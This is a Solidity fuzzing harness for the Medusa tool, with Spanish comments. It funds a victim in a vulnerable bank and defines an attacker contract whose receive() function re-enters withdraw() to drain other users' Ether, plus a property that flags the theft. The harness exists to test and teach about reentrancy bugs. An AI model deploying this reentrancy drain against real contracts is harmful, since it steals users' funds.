// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./Reentrancy.sol";

// Truco avanzado: Interfaz de Cheatcodes (HEVM) para poder crear dinero de la nada
interface HEVM {
    function deal(address, uint256) external;
}

// 1. Contrato Fantasma para simular a "los otros usuarios" a los que vamos a robar
contract Victim {
    VulnerableBank public bank;
    constructor(VulnerableBank _bank) {
        bank = _bank;
    }
    // La víctima deposita su propio dinero en el banco
    function depositToBank(uint256 amount) external {
        bank.deposit{value: amount}();
    }
}

// 2. Contrato de prueba para Medusa que actúa como Atacante
contract ReentrancyMedusa {
    VulnerableBank public bank;
    uint256 public totalDeposited;
    uint256 public totalWithdrawn; // ¡NUEVA VARIABLE MAGNÍFICA DEL USUARIO!
    bool private victimInitialized = false;

    // Conectamos a Medusa con los Cheatcodes nativos de la EVM
    HEVM constant vm = HEVM(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor() {
        bank = new VulnerableBank();
    }

    // SETUP DEL ENTORNO
    function setUpVictim() public {
        if (!victimInitialized) {
            Victim victim = new Victim(bank);
            // fondo de las victimas +10eth
            vm.deal(address(victim), 10 ether);

            // victima deposita
            victim.depositToBank(10 ether);
            victimInitialized = true;
        }
    }

    //Medusa deposita
    function deposit() public payable {
        bank.deposit{value: msg.value}();
        totalDeposited += msg.value;
    }

    //Medusa retira sus fondos
    function withdraw() public {
        uint256 bal = bank.balances(address(this));
        if (bal > 0) {
            bank.withdraw(); // El fallo se ejecutará aquí
        }
    }

    // LA TRAMPA: Reentrada asíncrona
    // Se invocará sola cuando el Banco nos mande nuestro Ether original (porque la EVM secuestra el hilo)
    receive() external payable {
        if (msg.sender == address(bank)) {
            totalWithdrawn += msg.value; // Sumamos todo el dinero que el banco nos envía
            
            if (address(bank).balance > 0) {
                bank.withdraw(); // ¡BAM! Volvemos a pedir dinero ANTES de que el Banco ponga nuestro saldo a 0
            }
        }
    }

    // PROPIEDAD REY (VERSIÓN DEL USUARIO): "El atacante nunca debe ganar más dinero del que depositó"
    function property_attacker_did_not_steal() public view returns (bool) {
        if (!victimInitialized) return true; // Ignorar si todavía nadie inyectó 10ETH externos
        
        // Si totalWithdrawn es MAYOR que el totalDeposited... significa que hemos robado!
        // Y por tanto, la aserción de que "no robamos" debe fallar devolviendo FALSE.
        return totalWithdrawn <= totalDeposited;
    }
}
